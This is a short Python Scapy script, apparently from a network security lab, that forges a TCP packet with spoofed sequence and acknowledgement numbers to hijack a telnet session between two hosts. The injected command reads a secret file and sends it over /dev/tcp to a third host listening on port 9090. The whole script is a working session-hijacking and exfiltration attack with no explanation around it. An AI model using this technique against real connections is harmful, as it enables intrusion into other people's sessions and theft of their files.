#!/usr/bin/env python3
import os
os.sys.path.append('/home/eternity/.local/lib/python3.8/site-packages')
from scapy.all import *
ip = IP(src="10.9.0.1", dst="10.9.0.7")
tcp = TCP(sport=42610, dport=23, flags=0x010, seq=219617280,ack=2090283454)
data = "\r cat /home/eternity/secret > /dev/tcp/10.9.0.6/9090\r"
pkt = ip/tcp/data
ls(pkt)
send(pkt,verbose=0)

